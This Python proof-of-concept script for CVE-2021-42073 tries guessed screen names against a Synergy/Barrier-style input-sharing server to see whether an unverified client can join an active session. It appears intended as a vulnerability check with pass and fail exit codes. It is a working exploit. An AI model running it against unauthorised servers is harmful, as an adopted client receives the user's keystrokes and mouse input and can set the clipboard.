#!/usr/bin/env python3
"""
CVE-2021-42073 - attacker can enter an active session by guessing a screen name.

The server decides whether a client may join purely by the label it sends in
kMsgHelloBack. Server::adoptClient refuses the connection with EUNK when the
name is absent from the config, and otherwise adds it to the client list. The
label is the only thing consulted, and the default in a stock config is
"Unnamed", so a name is guessable from the config defaults or from hostnames
and other public information.

Once adopted, the client is a full participant: it receives input device events
whenever the user switches to that screen, and it can set the server clipboard.

This was fixed in 1.18.0 by the same work as CVE-2021-42072. The server now
verifies the peer's TLS certificate fingerprint against trusted-clients, so an
unknown peer never reaches the point where its name is read.

Each name is tried on a fresh connection because a refusal closes the socket.
What the server sends back after the handshake is the verdict:

  no EUNK or EBSY, session messages follow   name accepted, session joined
  EBSY                                       name is in the config but taken
  EUNK                                       name is not in the config
  connection dropped after the tls handshake fingerprint check refused us

Reaching a session means VULNERABLE. Getting as far as EUNK or EBSY means the
identity check is not stopping us either, but no free configured name was
guessed, so that is reported as inconclusive rather than clean.

Exit codes: 1 VULNERABLE, 0 PASS, 2 inconclusive.
"""

import argparse
import os
import socket
import ssl
import struct
import subprocess
import sys
import tempfile

HELLO_NAMES = (b"Synergy", b"Barrier")
PROTO_MAJOR, PROTO_MINOR = 1, 8

# "Unnamed" is the stock default; the rest are the sort of thing a name is
# guessed from when it has been changed.
DEFAULT_NAMES = ["Unnamed", socket.gethostname(), "synergy", "deskflow", "barrier", "laptop", "desktop"]


def make_throwaway_cert(directory):
    cert = os.path.join(directory, "poc.crt")
    key = os.path.join(directory, "poc.key")
    subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "1",
         "-keyout", key, "-out", cert, "-subj", "/CN=synergy-poc"],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    return cert, key


def recv_packet(sock):
    header = sock.recv(4)
    if len(header) < 4:
        return None
    size = struct.unpack(">I", header)[0]
    if size == 0 or size > 65536:
        return None
    body = b""
    while len(body) < size:
        chunk = sock.recv(size - len(body))
        if not chunk:
            break
        body += chunk
    return body


def try_name(host, port, cert, key, name, timeout):
    """Returns one of: session, busy, unknown, blocked, error."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)

    outcome = "error"
    try:
        sock = ctx.wrap_socket(socket.create_connection((host, port), timeout=timeout))
    except (OSError, ssl.SSLError):
        return "blocked"

    sock.settimeout(timeout)
    try:
        hello = recv_packet(sock)
        if hello is None or not hello.startswith(HELLO_NAMES):
            outcome = "blocked"
        else:
            encoded = name.encode()
            body = hello[:7] + struct.pack(">hh", PROTO_MAJOR, PROTO_MINOR)
            body += struct.pack(">I", len(encoded)) + encoded
            sock.sendall(struct.pack(">I", len(body)) + body)

            outcome = "session"
            for _ in range(8):
                packet = recv_packet(sock)
                if packet is None:
                    break
                code = packet[:4]
                if code == b"EUNK":
                    outcome = "unknown"
                    break
                if code == b"EBSY":
                    outcome = "busy"
                    break
                if code == b"QINF":
                    info = b"DINF" + struct.pack(">7h", 0, 0, 1920, 1080, 0, 960, 540)
                    sock.sendall(struct.pack(">I", len(info)) + info)
    except (OSError, ssl.SSLError):
        if outcome == "error":
            outcome = "blocked"
    finally:
        sock.close()

    return outcome


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--names", nargs="+", default=DEFAULT_NAMES,
                    help="screen names to try (default: stock and commonly guessed names)")
    ap.add_argument("--cert", help="client certificate to offer (default: generate a throwaway)")
    ap.add_argument("--key", help="private key for --cert")
    args = ap.parse_args()

    print("CVE-2021-42073 - active session via a guessed screen name")
    print(f"target: {args.host}:{args.port}")
    print(f"trying {len(args.names)} name(s)\n")

    if bool(args.cert) != bool(args.key):
        print("[ERROR] --cert and --key must be given together")
        return 2

    tmp = None
    if args.cert:
        cert, key = args.cert, args.key
    else:
        tmp = tempfile.TemporaryDirectory()
        try:
            cert, key = make_throwaway_cert(tmp.name)
        except (OSError, subprocess.CalledProcessError) as exc:
            print(f"[ERROR] could not generate a certificate with openssl: {exc}")
            print("        pass --cert and --key instead")
            return 2

    results = {}
    try:
        for name in args.names:
            outcome = try_name(args.host, args.port, cert, key, name, args.timeout)
            results[name] = outcome
            print(f"    {name!r}: {outcome}")
    finally:
        if tmp:
            tmp.cleanup()

    print()
    joined = [n for n, o in results.items() if o == "session"]
    if joined:
        print(f"[FAIL] joined an active session as {joined[0]!r} - VULNERABLE (CVE-2021-42073)")
        print("       this client would receive input events and could set the server clipboard")
        return 1

    reached = [n for n, o in results.items() if o in ("busy", "unknown")]
    if reached:
        print("[ERROR] the handshake was not refused, so peer identity is not being checked,")
        print("        but none of the names tried was both configured and free.")
        print("        try --names with likely screen names before trusting this result")
        return 2

    print("[PASS] server refused the connection before any name was considered")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
